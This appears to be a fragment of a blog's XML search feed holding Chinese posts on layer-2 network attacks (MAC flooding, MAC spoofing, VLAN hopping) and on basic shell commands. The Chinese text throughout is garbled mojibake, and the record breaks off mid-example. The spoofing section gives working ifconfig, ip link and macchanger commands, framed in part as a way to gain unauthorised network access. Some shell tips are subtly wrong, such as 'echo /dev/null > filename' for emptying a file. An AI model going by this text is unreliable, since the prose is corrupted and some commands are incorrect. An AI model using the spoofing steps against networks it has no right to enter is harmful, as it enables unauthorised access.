        <content type="html"><![CDATA[<h1 id="å®‰å…¨å¨èƒ">å®‰å…¨å¨èƒ</h1><h2 id="mac-flooding">MAC flooding</h2><p>MAC æ³›æ´ªï¼Œä¹Ÿæœ‰ä¸€å°éƒ¨åˆ†èµ„æ–™ç§°å…¶ä¸ºäº¤æ¢æœºæ¯’åŒ–ï¼ˆSwitch poisoningï¼‰</p><p>æ”»å‡»æ–¹å‘é€å¤§é‡çš„å…·æœ‰ä¸åŒçš„æº MAC åœ°å€çš„å¸§ï¼Œç”±äºäº¤æ¢æœºçš„è‡ªå­¦ä¹ èƒ½åŠ›ï¼Œè¿™äº›æ–°çš„ â€œMAC åœ°å€-ç«¯å£â€æ˜ å°„å¯¹ä¼šå¿«é€Ÿå¡«å……æ•´ä¸ªäº¤æ¢æœºè¡¨ï¼Œå¯¼è‡´ä¹‹ååˆæ³•çš„è¯·æ±‚å°±æ²¡æœ‰äº†å¯ç”¨çš„ç©ºé—´ï¼Œç»“æœäº¤æ¢æœºå®Œå…¨é€€åŒ–ä¸ºå¹¿æ’­æ¨¡å¼ï¼Œæ”»å‡»è€…å°±å¯ä»¥ç”¨å·¥å…·æ¥å—…æ¢è¿™äº›è¢«å¹¿æ’­çš„å¸§ï¼Œè¾¾åˆ°çªƒå¬æ•°æ®çš„ç›®çš„ã€‚</p><h2 id="mac-spoofing">MAC spoofing</h2><p>MAC åœ°å€æ¬ºéª—</p><h3 id="ä»‹ç»">ä»‹ç»</h3><p>MAC æ¬ºéª—æ˜¯ä¸€ç§ç”¨äºä½¿ç”¨æŒ‡å®š MACåœ°å€çš„æŠ€æœ¯ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç½‘å¡ä¸­å·²å†™æ­»çš„ MACåœ°å€ä¸å¯æ›´æ”¹ã€‚å¦å¤–ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸€äº›å·¥å…·æ¥æ¬ºéª—ä½ çš„æ“ä½œç³»ç»Ÿï¼Œä½¿å…¶è®¤ä¸ºç½‘å¡çœŸçš„å…·æœ‰ä½ æŒ‡å®šçš„MAC åœ°å€ã€‚æœ¬è´¨ä¸Šæ¥è®²ï¼ŒMACæ¬ºéª—å°±æ˜¯æ›´æ”¹è®¡ç®—æœºçš„èº«ä»½ã€‚è¿™åœ¨æŠ€æœ¯ä¸Šæ˜¯ä¸€ä»¶å¾ˆå®¹æ˜“çš„äº‹æƒ…ã€‚</p><p>å±å®³æˆ–è€…æ”»å‡»ç›®çš„ï¼š ä½¿ç”¨ MAC åœ°å€æ¬ºéª—å¯å¯¹æŸä¸ªç½‘ç»œè¿›è¡Œéæˆæƒè®¿é—®ã€‚</p><p>å±€é™ï¼š MAC åœ°å€æ¬ºéª—æŠ€æœ¯çš„å½±å“ä»…é™äºæœ¬åœ°å¹¿æ’­åŸŸã€‚ ä¸ IPåœ°å€æ¬ºéª—ä¸åŒï¼Œå‘é€è€…å‡å†’å…¶ IP åœ°å€ï¼Œä»¥ä½¿æ¥æ”¶è€…å°†å“åº”å‘é€åˆ°å…¶ä»–åœ°æ–¹ï¼Œè€Œåœ¨MAC åœ°å€æ¬ºéª—ä¸­ï¼Œå¦‚æœæœªé…ç½®äº¤æ¢æœºä»¥é˜²æ­¢ MACæ¬ºéª—ï¼Œåˆ™é€šå¸¸ç”±æ¬ºéª—æ–¹æ¥æ”¶å“åº”ã€‚</p><p>ä»¥ä¸Šä»‹ç»ä¸»è¦æ¥è‡ªäº <ahref="https://zh.wikipedia.org/wiki/MAC%E6%AC%BA%E9%AA%97">MAC æ¬ºéª—Wikipedia</a></p><h3 id="æ“ä½œæ–¹æ³•">æ“ä½œæ–¹æ³•</h3><p>åªè¦ç½‘å¡çš„é©±åŠ¨ç¨‹åºæ”¯æŒä¿®æ”¹ç½‘å¡çš„ç‰©ç†åœ°å€ï¼Œåœ¨ Linux ç³»ç»Ÿä¸‹ä¿®æ”¹ MACåœ°å€æ˜¯éå¸¸æ–¹é¢çš„ã€‚</p><p>ä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸¤ç±»æ–¹æ³•ï¼š</p><h4 id="æ–¹æ³•ä¸€ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦å‘½ä»¤">æ–¹æ³•ä¸€ï¼Œä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦å‘½ä»¤</h4><p>åŸºæœ¬æ­¥éª¤ï¼š</p><ol start="0" type="1"><li>æŸ¥çœ‹è®°å½•ä½ çš„åŸ MAC åœ°å€ï¼Œä»¥ä¾¿åé¢æ”¹å›æ¥</li><li>ç¦ç”¨ç½‘å¡</li><li>è®¾ç½®ç½‘å¡çš„ MAC åœ°å€</li><li>å¯ç”¨ç½‘å¡</li></ol><p>æŸ¥çœ‹è‡ªå·±çš„ç½‘å¡åç§°: <code>ifconfig</code>, <code>lo</code>æ˜¯æœ¬åœ°å›ç¯ï¼Œ<code>wlo1</code> æ˜¯æ— çº¿ç½‘å¡ï¼Œ <code>eno1</code> æˆ–è€…<code>ethe0</code> ä¹‹ç±»çš„å°±æ˜¯ä½ çš„ç½‘å¡åã€‚è¿™é‡Œæˆ‘çš„ç½‘å¡åç§°ä¸º<code>eno1</code>ï¼Œæ‰€ä»¥ä¸‹é¢æ¼”ç¤ºçš„å‘½ä»¤ä¸­çš„ <code>eno1</code>è¡¨ç¤ºç½‘å¡åç§°ã€‚</p><p>ether è¡¨ç¤ºæ˜¯ä»¥å¤ªç½‘ç±»å‹çš„ç½‘å¡ï¼Œâ€œbdcdaaabccffâ€œæ˜¯éšæœºè®¾ç½®çš„ä¸€ä¸ªåœ°å€ï¼Œä½¿ç”¨ â€œifconfig eno1â€å³å¯æŸ¥çœ‹è¯¥ç½‘å¡çš„è¯¦ç»†ä¿¡æ¯ï¼Œä»è€Œåˆ¤æ–­ MAC åœ°å€ä¿®æ”¹æ˜¯å¦ç”Ÿæ•ˆã€‚</p><p>ä½¿ç”¨è¯¥æ–¹æ³•æœ‰å‡ ç‚¹ä¸æ–¹ä¾¿çš„æ˜¯ï¼š</p><ol type="1"><li>ç”¨æˆ·éœ€è¦è‡ªè¡Œä¿å­˜åŸ MAC åœ°å€ï¼Œç„¶åå†ç”¨ç›¸åŒçš„æ–¹æ³•æ¢å¤</li><li>æ¯æ¬¡éœ€è¦æ“ä½œä¸‰ä¸ªæ­¥éª¤</li><li>ä¸çŸ¥é“ç½‘å¡é”€å”®å•†çš„å‰ä¸‰ä¸ªå­—èŠ‚æ ‡å¿—ï¼Œå¦‚æœéšæœºæ”¹çš„è¯ï¼Œæœ‰çš„ç½‘ç»œæˆ–ç½‘ç«™ä¸è®¤å¯ã€‚</li></ol><p>å·¥å…·ä¸€: <code>ifconfig</code></p><p><code>ifconfig</code> ä¸‰æ¡å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># æ ¹æ®ä¸Šä¸€æ­¥çš„ç»“æœæŸ¥çœ‹ä½ çš„åŸ MAC åœ°å€ï¼Œå¹¶è®°å½•</span></span></span><br><span class="line">ifconfig eth0 down</span><br><span class="line">ifconfig eth0 hw ether 0000aabbccff</span><br><span class="line">ifconfig eth0 up</span><br></pre></td></tr></table></figure><p>å·¥å…·äºŒï¼š <code>iproute2</code></p><p>è¯¥å·¥å…·å¯èƒ½æœ‰çš„å‘è¡Œç‰ˆæ²¡æœ‰ï¼Œéœ€è¦è‡ªå·±å®‰è£…ï¼Œ Arch ç³» Linux å®‰è£…å‘½ä»¤:``</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip link show eno1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># æ ¹æ®ä¸Šä¸€æ­¥çš„ç»“æœæŸ¥çœ‹ä½ çš„åŸ MAC åœ°å€ï¼Œå¹¶è®°å½•</span></span></span><br><span class="line">ip link set dev eno1 down</span><br><span class="line">ip link set dev eno1 address XX:XX:XX:XX:XX:XX</span><br><span class="line">ip link set dev eno1 up</span><br></pre></td></tr></table></figure><h4 id="æ–¹æ³•ä¸€ä½¿ç”¨ä¸“é—¨çš„-mac-åœ°å€ä¿®æ”¹å·¥å…·">æ–¹æ³•ä¸€ï¼Œä½¿ç”¨ä¸“é—¨çš„ MACåœ°å€ä¿®æ”¹å·¥å…·</h4><p>ä¸“ç”¨å·¥å…·: <code>macchanger</code>, ä¸€é”®æå®š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">macchanger --<span class="built_in">help</span></span></span><br><span class="line">GNU MAC Changer</span><br><span class="line">Usage: macchanger [options] device</span><br><span class="line"></span><br><span class="line">  -h,  --help                   Print this help</span><br><span class="line">  -V,  --version                Print version and exit</span><br><span class="line">  -s,  --show                   Print the MAC address and exit</span><br><span class="line">  -e,  --ending                 Don&#x27;t change the vendor bytes</span><br><span class="line">  -a,  --another                Set random vendor MAC of the same kind</span><br><span class="line">  -A                            Set random vendor MAC of any kind</span><br><span class="line">  -p,  --permanent              Reset to original, permanent hardware MAC</span><br><span class="line">  -r,  --random                 Set fully random MAC</span><br><span class="line">  -l,  --list[=keyword]         Print known vendors</span><br><span class="line">  -b,  --bia                    Pretend to be a burned-in-address</span><br><span class="line">  -m,  --mac=XX:XX:XX:XX:XX:XX  Set the MAC XX:XX:XX:XX:XX:XX</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œå¯ä»¥çœ‹ä¸€ä¸‹å½“å‰ç”µè„‘çš„ MAC åœ°å€å’Œç½‘å¡å›ºä»¶ä¸Šçš„ MAC åœ°å€:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">macchanger -s eno1</span></span><br><span class="line">Current MAC:   xx:xx:xx:xx:xx:xx (unknown)</span><br><span class="line">Permanent MAC: xx:xx:xx:xx:xx:xx (unknown)</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œä½¿ç”¨ç‰¹æƒç”¨æˆ·è®¾ç½®éšæœºè®¾ç½®ä¸€ä¸ªåŒ vendor çš„ MACåœ°å€ï¼Œç„¶åå®æ–½ä½ è¿›è¡Œ MAC æ¬ºéª—çš„ç›®æ ‡æ“ä½œã€‚</p><p>ä½¿ç”¨éç‰¹æƒç”¨æˆ·è¿è¡Œä¼šæŠ¥é”™:<code>[ERROR] Could not change MAC: interface up or insufficient permissions: Operation not permitted</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo macchanger -A eno1</span></span><br><span class="line">[sudo] password for violetv:</span><br><span class="line">Current MAC:   xx:xx:xx:xx:xx:xx (unknown)</span><br><span class="line">Permanent MAC: xx:xx:xx:xx:xx:xx (unknown)</span><br><span class="line">New MAC:       dd:dd:dd:dd:dd:dd (Alcatel-Lucent)</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œæ¢å¤åŸ MACï¼Œæå®šã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo macchanger -p eno1</span></span><br><span class="line">Current MAC:   dd:dd:dd:dd:dd:dd (Alcatel-Lucent)</span><br><span class="line">Permanent MAC: xx:xx:xx:xx:xx:xx (unknown)</span><br><span class="line">New MAC:       xx:xx:xx:xx:xx:xx (unknown)</span><br></pre></td></tr></table></figure><h2 id="arp-spoofing">ARP spoofing</h2><ul class="task-list"><li><label><input type="checkbox" />spoofing links</label></li></ul><h2 id="vlan-hopping">VLAN Hopping</h2><p>è™šæ‹Ÿå±€åŸŸç½‘è·³è·ƒæ”»å‡»</p><p>VLAN Hopping æ¼æ´å…è®¸æ”»å‡»è€…ç»•è¿‡ä¸ºåˆ’åˆ†ä¸»æœºè€Œæ„å»ºçš„ä»»ä½•ç¬¬ 2å±‚ï¼ˆæ•°æ®é“¾è·¯å±‚ï¼‰é™åˆ¶ã€‚å¦‚æœç½‘ç»œç®¡ç†å‘˜å¯¹äº¤æ¢æœºç«¯å£è¿›è¡Œäº†æ­£ç¡®é…ç½®ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¿…é¡»é€šè¿‡è·¯ç”±å™¨æˆ–å…¶ä»–ç¬¬3 å±‚è®¾å¤‡æ‰èƒ½è®¿é—®å…¶ç›®æ ‡ã€‚ç„¶è€Œï¼Œåœ¨è®¸å¤šç½‘ç»œä¸­éƒ½æ²¡æœ‰åˆç†çš„è¿›è¡Œ VLANè§„åˆ’ï¼Œæˆ–è€…å¯¹ VLANè¿›è¡Œäº†é”™è¯¯é…ç½®ï¼Œè¿™æ ·ä¸€æ¥æ”»å‡»è€…å°±èƒ½å¤Ÿè¿›è¡Œè¯¥æ¼æ´åˆ©ç”¨ã€‚</p><p>VLAN Hopping çš„ä¸¤ç§æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯â€œäº¤æ¢æ¬ºéª—â€ï¼ˆSwitchedSpoofingï¼‰å’Œâ€œåŒé‡æ ‡è®°â€ï¼ˆDouble Taggingï¼‰</p><p>æˆ‘ä»¬åœ¨è¿™é‡Œå¹¶ä¸æ˜¯å¯¹è®¾å¤‡å­˜åœ¨çš„æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼Œè€Œæ˜¯é’ˆå¯¹äºåè®®å’Œé…ç½®å­˜åœ¨çš„æ¼æ´ã€‚</p><p><ahref="https://cybersecurity.att.com/blogs/security-essentials/vlan-hopping-and-mitigation">VLANHopping: How to Mitigate an Attack</a></p><p><a href="https://www.4hou.com/posts/X5Qo">ä¸Šæ–‡çš„ä¸­æ–‡ç¿»è¯‘å¯¹ç…§_VLANHopping æ”»å‡»æŠ€æœ¯ä¸ç¼“è§£æªæ–½</a></p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><ahref="https://wiki.archlinux.org/index.php/MAC_address_spoofing">MACaddress spoofing</a> <ahref="https://www.cnblogs.com/Dio-Hch/p/11868758.html">MACåœ°å€æ¬ºéª—</a></p>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> osi_sec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶åŠç›®å½•ç®¡ç†</title>
      <link href="/blog/2020/07/17/programming/shell/3.file_dir/"/>
      <url>/blog/2020/07/17/programming/shell/3.file_dir/</url>
      
        <content type="html"><![CDATA[<h2 id="åˆ›å»ºå’Œåˆ é™¤">åˆ›å»ºå’Œåˆ é™¤</h2><h3 id="åˆ›å»ºç›®å½•">åˆ›å»ºç›®å½•</h3><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>mkdir</code> åˆ›å»ºç›®å½•ã€‚</p><p>æ³¨ï¼šlinux ç›®å½•ä¹Ÿå¯ä»¥ç”¨åŒæ–œçº¿</p><blockquote><p>$ mkdir --help Usage: mkdir [OPTION]... DIRECTORY... Create theDIRECTORY(ies), if they do not already exist.</p><p>Mandatory arguments to long options are mandatory for short optionstoo. -m, --mode=MODE set file mode (as in chmod), not a=rwx - umask -p,--parents no error if existing, make parent directories as needed -v,--verbose print a message for each created directory...ç­‰ç­‰ä¸å¸¸ç”¨çš„å…¶ä»–é€‰é¡¹</p></blockquote><ol start="0" type="1"><li><p><code>mkdir</code>åœ¨æŒ‡å®šçš„ç›®å½•åä¸å­˜åœ¨çš„æƒ…å†µä¸‹åˆ›å»ºç›®å½•ï¼ˆä¸€æ¬¡åˆ›å»ºå¤šä¸ªï¼Œç©ºæ ¼åˆ†éš”å³å¯ï¼‰ã€‚å¦‚æœç›®å½•ï¼ˆæ¯”å¦‚ï¼š<code>test1</code>ï¼‰å­˜åœ¨ï¼Œé‚£ä¹ˆä¼šæŠ¥é”™æç¤ºä½ ï¼š<code>mkdir: cannot create directory â€˜test1â€™: File exists</code></p></li><li><p><code>-p</code> option</p><ol type="1"><li>å¦‚æœæŒ‡å®šåˆ›å»ºç›®å½•å·²å­˜åœ¨ï¼Œä¹Ÿä¸ä¼šæŠ¥é”™</li><li>åˆ›å»ºå‰¯ç›®å½•ï¼Œå¦‚æœéœ€è¦çš„è¯ã€‚==è¾ƒå¸¸ç”¨==æ„æ€å°±æ˜¯ä½ å¯ä»¥æŒ‡å®šåœ¨ä¸å­˜åœ¨çš„ç›®å½•ä¸‹åˆ›å»ºç›®å½•ï¼Œè¿™æ ·å®ƒä¼šå¸®ä½ æŠŠä¸å­˜åœ¨çš„çˆ¶ç›®å½•ä¹Ÿåˆ›å»ºå‡ºæ¥ã€‚</li></ol></li><li><p><code>-m</code> optionè®¾ç½®<strong>ä½ è¦åˆ›å»ºçš„è¿™ä¸ªæ–‡ä»¶å¤¹</strong>çš„æƒé™ï¼ˆæ³¨æ„ï¼šè¿™æœ‰ä¹‹åä½ åœ¨è¯¥æ–‡ä»¶å¤¹åˆ›å»ºçš„æƒé™æ— å…³ï¼‰è®¾ç½®æ–¹å¼å’Œ chmod è®¾ç½®æ–¹å¼ä¸€è‡´ï¼Œå¦‚: <code>mkdir -m 754 dir_name</code>,<code>mkdir -m a+x test3</code></p></li><li><p><code>-v</code> option æ˜¾ç¤ºåˆ›å»ºæ–‡ä»¶æ¶ˆæ¯</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> -vp  test4/yest/sd</span></span><br><span class="line">mkdir: created directory &#x27;test4&#x27;</span><br><span class="line">mkdir: created directory &#x27;test4/yest&#x27;</span><br><span class="line">mkdir: created directory &#x27;test4/yest/sd</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="æ¸…ç©ºä¸åˆ é™¤">æ¸…ç©ºä¸åˆ é™¤</h2><h3 id="æ¸…ç©º">æ¸…ç©º</h3><ol type="1"><li><p><code>: &gt; filename</code>ï¼ˆæ¨èï¼‰ <code>:</code> åœ¨ shellä¸­æ˜¯ç©ºå‘½ä»¤ï¼Œä»€ä¹ˆä¹Ÿä¸åšã€‚è¿™é‡Œå°±æ˜¯å°†<strong>ç©º</strong>é‡å®šå‘åˆ°æ–‡ä»¶ã€‚</p></li><li><p><code>&gt; test.txt</code> é‡å®šå‘å‘½ä»¤è¡Œè¾“å…¥åˆ°æ–‡ä»¶ï¼Œä½ ç›´æ¥<code>Ctrl+d</code> ç»“æŸå‘½ä»¤è¡Œè¾“å…¥ï¼Œç„¶åå°±ç›¸å½“äºæ¸…ç©ºæ–‡ä»¶äº†ã€‚</p></li><li><p>åˆ©ç”¨ <code>/dev/null</code><code>echo /dev/null &gt; filename</code>ï¼Œ<code>cat /dev/null &gt; filename</code>ï¼Œ<code>cp /dev/null filename</code></p></li><li><p>é‡å®šå‘ç©ºæ ¼ <code>echo "" &gt; test.txt</code>æ­¤å‘½ä»¤ä¼šå¯¼è‡´æ–‡ä»¶ä¸­åŒ…å«æ¢è¡Œã€‚</p></li></ol><h3 id="åˆ é™¤">åˆ é™¤</h3><p><code>rm</code> å‘½ä»¤åˆ é™¤æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-r, -R, --recursive</span><br><span class="line">      remove directories and their contents recursively</span><br><span class="line">-f, --force</span><br><span class="line">      ignore nonexistent files and arguments, never prompt</span><br><span class="line"></span><br><span class="line">-i     prompt before every removal</span><br><span class="line"></span><br><span class="line">-I     prompt  once  before  removing  more than three files, or</span><br><span class="line">      when removing recursively; less intrusive than -i,  while</span><br><span class="line">      still giving protection against most mistakes</span><br></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹">æŸ¥çœ‹</h2><p><code>cat vim head tail more less</code></p><p>è§åšæ–‡ <a href="https://violetus.life/shell/vim/">vimå…¥é—¨ç®€å•ä½¿ç”¨</a> è§åšæ–‡ <ahref="https://violetus.life/shell/head_tail/">head å’Œ tail å‘½ä»¤</a></p><h2 id="æŸ¥æ‰¾">æŸ¥æ‰¾</h2><p>è§åšæ–‡ï¼š<a href="https://violetus.life/shell/find/">find å‘½ä»¤</a></p><h2 id="é‡å‘½å">é‡å‘½å</h2><p>rename å‘½ä»¤</p><p>ä¸åŒå‘è¡Œç‰ˆä¸Šï¼Œé¢„è£…çš„ rename ä¸ä¸€è‡´ã€‚ rename æœ‰ä¸¤ç§ç‰ˆæœ¬ï¼š c è¯­è¨€ç‰ˆå’Œperl ç‰ˆï¼Œåè€…æ›´å¼ºå¤§.,å¯ä»¥ä½¿ç”¨ perl æ­£åˆ™ï¼Œä½†æ˜¯å‰è€…é¢„è£…çš„æ¯”è¾ƒå¤šã€‚ debianåŠ ubuntu ä¸Šåº”è¯¥æ˜¯é¢„è£…çš„ perl ç‰ˆçš„</p><p>å…·ä½“å¯ä»¥çœ‹ <ahref="https://github.com/tldr-pages/tldr/issues/3125">The 'rename'command has multiple different versions #3125</a> çš„è°ƒæŸ¥ã€‚</p><p>æœ¬äººç”¨çš„ Manajroï¼ˆArch basedï¼‰é¢„è£…çš„ cè¯­è¨€ç‰ˆæœ¬çš„ï¼Œå°éœ€æ±‚å¯ä»¥æ»¡è¶³ï¼Œæ¯”å¦‚ï¼š</p><ol type="1"><li>æ‰¹é‡ç»Ÿä¸€åç¼€æ•°å­—é•¿åº¦ï¼ˆ1--&gt;001 ç­‰ï¼‰</li><li>æ‰¹é‡æ›¿æ¢ï¼ˆåˆ é™¤å›ºå®šå­ä¸²ï¼‰ï¼Œå¸¸ç”¨æ¥æ‰¹é‡åˆ é™¤ä¸€äº›è¯¾ç¨‹çš„è”ç³»å¾®ä¿¡ç­‰<code>rename "å­—ç¬¦ä¸²" "è¦æ›¿æ¢ä¸ºçš„å­—ç¬¦ä¸²" ./*</code></li></ol><p>Aur é‡Œé¢ä¹Ÿæœ‰ <code>perl-rename</code>, å³ï¼š perl ç‰ˆçš„renameï¼Œæš‚æ—¶ç”¨ä¸åˆ°ï¼Œæ²¡è£…ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>shell åˆ†æ”¯</title>
      <link href="/blog/2020/07/17/programming/shell/6.branch/"/>
      <url>/blog/2020/07/17/programming/shell/6.branch/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸºæœ¬åˆ†æ”¯ç»“æ„">åŸºæœ¬åˆ†æ”¯ç»“æ„</h2><p>if-then(-else) è¯­æ³•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if command</span><br><span class="line">then</span><br><span class="line">    commands</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if command; then</span><br><span class="line">    commands</span><br><span class="line">else</span><br><span class="line">    commands</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>bash shell çš„ if è¯­å¥ä¼šè¿è¡Œ ifåé¢çš„é‚£ä¸ªå‘½ä»¤ã€‚å¦‚æœè¯¥å‘½ä»¤çš„<strong>é€€å‡ºçŠ¶æ€ç </strong>æ˜¯0ï¼ˆè¯¥å‘½ä»¤æˆåŠŸè¿è¡Œï¼‰ï¼Œä½äº thenéƒ¨åˆ†çš„å‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œã€‚å¦‚æœè¯¥å‘½ä»¤çš„é€€å‡ºçŠ¶æ€ç æ˜¯å…¶ä»–å€¼éƒ¨åˆ†çš„å‘½ä»¤ï¼Œå°± elseéƒ¨åˆ†çš„å‘½ä»¤ä¼šè¢«æ‰§è¡Œï¼Œbash shell ä¼šç»§ç»­æ‰§è¡Œè„šæœ¬ä¸­çš„ä¸‹ä¸€ä¸ªå‘½ä»¤ã€‚fiè¯­å¥ç”¨æ¥è¡¨ç¤º if-then è¯­å¥åˆ°æ­¤ç»“æŸã€‚</p><p>å½“ä½ æƒ³è¦å®ç°å¤šæ¬¡åˆ¤æ–­æ¡ä»¶æ¥è¿›è¡Œå¤šåˆ†æ”¯æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ elseéƒ¨åˆ†çš„å¦ä¸€ç§å½¢å¼ï¼š<code>elif</code>ã€‚è¿™æ ·å°±ä¸ç”¨å†ä¹¦å†™å¤šä¸ª if-thenè¯­å¥äº†ã€‚elif ä½¿ç”¨å¦ä¸€ä¸ª if-then è¯­å¥å»¶ç»­ else éƒ¨åˆ†ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if command1</span><br><span class="line">then</span><br><span class="line">    commands</span><br><span class="line">elif command2</span><br><span class="line">then</span><br><span class="line">    more commands</span><br><span class="line">else</span><br><span class="line">    commands</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šè®°ä½ï¼Œåœ¨ elif è¯­å¥ä¸­ï¼Œç´§è·Ÿå…¶åçš„ else è¯­å¥å±äº elifä»£ç å—ã€‚å®ƒä»¬å¹¶ä¸å±äºä¹‹å‰çš„ if-then ä»£ç å—ã€‚</p><p>if-thenè¯­å¥æœ¬èº«ä¸èƒ½æµ‹è¯•å‘½ä»¤é€€å‡ºçŠ¶æ€ç ä¹‹å¤–çš„æ¡ä»¶ï¼Œå®ƒéœ€è¦å€ŸåŠ©å…¶ä»–å‘½ä»¤æˆ–è¯­æ³•ã€‚ä¸‹é¢åˆ†åˆ«ä»‹ç»å‡ ç§å¸¸ç”¨çš„æ–¹æ³•ã€‚</p><h2 id="test-å‘½ä»¤">test å‘½ä»¤</h2><p>test å‘½ä»¤æä¾›äº†åœ¨ if-then è¯­å¥ä¸­æµ‹è¯•ä¸åŒæ¡ä»¶çš„é€”å¾„ã€‚å¦‚æœ testå‘½ä»¤ä¸­åˆ—å‡ºçš„æ¡ä»¶æˆç«‹ï¼Œtest å‘½ä»¤å°±ä¼šé€€å‡ºå¹¶è¿”å›é€€å‡ºçŠ¶æ€ç  0ã€‚è¿™æ · if-thenè¯­å¥å°±ä¸å…¶ä»–ç¼–ç¨‹è¯­è¨€ä¸­çš„ if-thenè¯­å¥ä»¥ç±»ä¼¼çš„æ–¹å¼å·¥ä½œäº†ã€‚å¦‚æœæ¡ä»¶ä¸æˆç«‹ï¼Œtestå‘½ä»¤å°±ä¼šé€€å‡ºå¹¶è¿”å›éé›¶çš„é€€å‡ºçŠ¶æ€ç ï¼Œè¿™ä½¿å¾— if-thenè¯­å¥ä¸ä¼šå†è¢«æ‰§è¡Œã€‚</p><p>test å‘½ä»¤æ ¼å¼ï¼ˆcondition æ˜¯ test å‘½ä»¤è¦æµ‹è¯•çš„ä¸€ç³»åˆ—å‚æ•°å’Œå€¼ï¼‰ï¼š<code>test condition</code></p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">str=2</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [20:10:49]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$str</span>==2</span></span><br><span class="line"><span class="meta prompt_">if&gt; </span><span class="language-bash"><span class="keyword">then</span></span></span><br><span class="line"><span class="meta prompt_">then&gt; </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta prompt_">then&gt; </span><span class="language-bash"><span class="keyword">else</span></span></span><br><span class="line"><span class="meta prompt_">else&gt; </span><span class="language-bash"><span 